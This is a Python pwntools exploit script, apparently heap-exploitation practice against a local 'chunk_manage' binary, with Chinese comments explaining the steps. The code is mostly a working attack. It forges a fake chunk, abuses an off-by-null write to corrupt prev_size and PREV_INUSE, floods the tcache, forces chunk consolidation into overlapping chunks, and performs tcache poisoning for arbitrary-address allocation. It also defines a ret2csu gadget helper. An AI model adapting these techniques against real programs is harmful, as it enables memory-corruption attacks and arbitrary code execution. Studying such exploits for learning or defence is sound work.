from pwn import *
from functools import wraps

ELF_name = '../bin/chunk_manage'
elf = context.binary = ELF(ELF_name)
libc = ELF( './libc.so.6')
#write_got = elf.symbols['read']

if args.DEBUG:
    context.log_level = "info"
else:
    context.log_level = "info"
if args.GDB:
    pass
    #context.terminal = ["tmux","splitw","-h"]

#context.log_level = "debug"

def show_message(func):
    @wraps(func)
    def run_func(*args,**kwargs):
        io.recvuntil("Show messages End\n")
        return func(*args,**kwargs)
    return run_func
gs = '''
b main
'''
def start():
    if args.DEBUG:
        print("why")
        return gdb.debug(elf.path,gdbscript=gs)
    else:
        #return process("../bin/chunk_manage")
        print("not why")
        return process(elf.path)
def interactive():
    io.interactive()

csu_front_addr = 0x4005d0
csu_end_addr = 0x4005e6

def csu(rbx,rbp,r12,r13,r14,r15,last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload =  p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    payload += p64(csu_front_addr)
    return payload

def malloc_chunk(chunk_id,size):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("1")
    io.recvuntil("Please input malloc id and size\n")
    if size.startswith("0x"):
        io.sendline(chunk_id +" " +str(int(size,16)))
    else:
        io.sendline(chunk_id + " " + str(int(size,10)))
    io.recvuntil("malloc the chunk success\n")
def free_chunk(chunk_id):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("2")
    io.recvuntil("Please input free id\n")
    io.sendline(chunk_id)
def edit_chunk(chunk_id,size,content):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("3")
    io.recvuntil("Please input the id\n")
    io.sendline(chunk_id)
    io.recvuntil("Please input the context size\n")
    io.sendline(str(int(size,16)))
    io.recvuntil("Please input the chunk note\n")
    io.send(content)

def leak_chunk_address(chunk_id):
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("5")
    io.recvuntil("which chunk address you need?\n")
    io.sendline(chunk_id)
    io.recvuntil("the chunk address is 0x")
    data = io.recvuntil("\n")[:-1]
    print(hex(int(data.decode('utf-8'),16)))
    return int(data.decode('utf-8'),16)
    #print(len(data))
    #print(u64(data))
def show_chunk():
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("4")
    data = io.recvuntil("all chunk info end")
    print(data)
@show_message
def manage_chunk():
    io.sendline("1")
    malloc_chunk("1","0x50")
    edit_chunk("1","0x20","helloworld")
    show_chunk()
    free_chunk("1")
    io.recvuntil("malloc free or edit chunk ,malloc 1 free 2 edit 3\n")
    io.sendline("9")


@show_message
def test_malloc_free():
    io.sendline("1")
    malloc_chunk("1","0x50")
    edit_chunk("1","0x40","A"*0x40)
    show_chunk()
    free_chunk("1")
'''
那么如果我们可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。
'''
@show_message
def off_by_null_attack():
    # print(hex(io.libc.address+0x1b8000)) #会修改目标地址 堆上的地址的值
    # targetaddr = p64(io.libc.address+0x1b8000-0x20)
    io.sendline("1")
    #0x38 0x28 0xf8
    malloc_chunk("1","0x38")  # chunk size 
    malloc_chunk("2","0x28")  # chunk size 
    
    malloc_chunk("3","0xf8") # chunk size 
    chunk1_address = leak_chunk_address("1")
    #fake_size = chunkA_size + chunkb_size + 0x10
    '''
    calc fake_size
    a -> 0x30 + 0x10
    0x30 + 0x20 + 0x10 //+ 0x8
    b -> 0x20 + 0x10
    '''
    fake_size = 0x38 + 0x28
    '''
    construct fake chunk1
    构造一个伪造的chunk块，使得3号可以merge到这里来
    a[0] = 0
    a[1] = p64(fake_size)
    a[2] = p64(chunk1_address)
    a[3] = p64(chunk1_address)
    '''
    fake_chunk1 = p64(0) + p64(fake_size) + p64(chunk1_address) * 2
    edit_chunk("1",str(len(fake_chunk1)),fake_chunk1)
    fake_chunkb = b'a' * 0x20 + p64(fake_size) + b'\x00'
    edit_chunk('2',str(len(fake_chunkb)),fake_chunkb)
    #gdb.attach(io)
    '''
    通过2号chunk 修改3号chunk的 prev_inuse位且修改3号的prev_size
    修改1号堆块的 size大小
    '''


    for i in range(0,7):
        malloc_chunk(str(i+4),"0xf8")
    for i in range(0,7):
        free_chunk(str(i+4))
    #malloc_chunk("2","512")  # chunk size 0x420
    #malloc_chunk("8","512")
    
    #这里达到的效果应该是 将chunk 1 放入到了unsorted bin中
    free_chunk("3")
    #free chunk 3 后，会进行chunk块的consolidate(merge),此时 1 2 3 号块merge成一个chunk块 A
    malloc_chunk("14","0x158")
    malloc_chunk("16","0x28")
    free_chunk("16")

    free_chunk("2")
    #free chunk 2 后，会将chunk2 B chunk放入到tcache 块的对应位置
    #注意： A chunk 块，此时包含了 B chunk块
    
    
    # 将 A chunk 块申请出来使用后，相对B chunk块，可以构成UAF,从而可以实现任意地址malloc

    ###
    # malloc_chunk("15","0x28")
    fake_payload = p64(0x5617ebd652a0)*6 + p64(chunk1_address+0x70)#+p64(chunk1_address+0x60) + p64(0x60)*2 + p64(0) + p64(0)
    edit_chunk("14",str(len(fake_payload)),fake_payload)
    #tcache poisoning
    malloc_chunk("20","0x28")
    malloc_chunk("21","0x28")
    gdb.attach(io,
    '''b source/chunk_manage.c:18
        c
    ''')
    #malloc_chunk("3","0x448")
    #edit_chunk("1","0x38","A"*0x38+b"\0".decode('utf-8'))
    #free_chunk("2") # put the chunk 2 into unsorted bin
    #gdb.attach(io)
    #malloc_chunk("4","0x498") # write the targetaddr value
    #gdb.attach(io,"b *$rebase(0x000001722)")
io = start()
off_by_null_attack()
io.interactive()

